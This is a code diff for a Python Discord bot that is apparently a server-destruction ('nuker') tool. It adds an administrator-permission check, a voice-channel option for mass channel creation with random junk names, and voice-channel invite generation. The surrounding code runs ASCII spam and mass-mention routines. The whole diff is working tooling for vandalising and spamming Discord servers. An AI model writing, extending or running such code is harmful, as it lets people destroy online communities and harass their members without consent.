@@ -26,6 +26,8 @@ init()
 print ("Make Sure you have modified smconfig.py before starting.")
 @client.event
 async def on_ready():
+    if changegameonlogin == True:
+        await client.change_presence(game=discord.Game(name=logingame))
     clear()
     print("Logged in as")
     print("User: "+str(client.user.name))
@@ -57,8 +59,12 @@ async def main(SERVER):
             #actions
             for c in server.channels:
                 myperms = c.permissions_for(server.get_member(client.user.id))
-                if myperms.ban_members:
+                if myperms.administrator:
                     channellist.append(c)
+                else:
+                    print (colored("You do not have the permissions to destroy this server.","red"))
+                    input ()
+                    await main(SERVER)
             for i in server.members:
                 users.append(i)
 
@@ -139,13 +145,21 @@ async def main(SERVER):
                         for x in range(60):
                             num = random.randrange(13000)
                             asc = asc + chr(num)
-                        print (asc)
                         await client.create_channel(server, asc)
-                    else:
+                    if chanmethod.lower() == "set":
                         await client.create_channel(server, channame)
+                    if chanmethod.lower() == "voice":
+                        await client.create_channel(server, channame, type=discord.ChannelType.voice)
+                    
                 print ('Channels Created.')
-            print('Preparing for next stage.')
+                
+            if chanmethod.lower() == "voice":
+                if chandel == True:
+                    print (colored("Not spamming, due to there only being voice channels in this server.","red"))
+                    input ()
+                    await main(SERVER)
 
+            print('Preparing for next stage.')
             if spammethod == "asc":
                 await ascii_spam(SERVER)
             if spammethod == "massment":
@@ -162,7 +176,15 @@ async def main(SERVER):
                     print (invite + " copied to clipboard.")
                     input ()
                     await main(SERVER)
-                           
+                    
+                elif channel.type == discord.ChannelType.voice:
+                    invitelinknew = await client.create_invite(destination=channel, xkcd=True, max_uses=100)
+                    invite = invitelinknew.url
+                    pyperclip.copy(invite)
+                    print (invite + " copied to clipboard.")
+                    input ()
+                    await main(SERVER)
+                    
         elif int(opts) == 3:
             play = input ("Playing ")
             await client.change_presence(game=discord.Game(name=play))
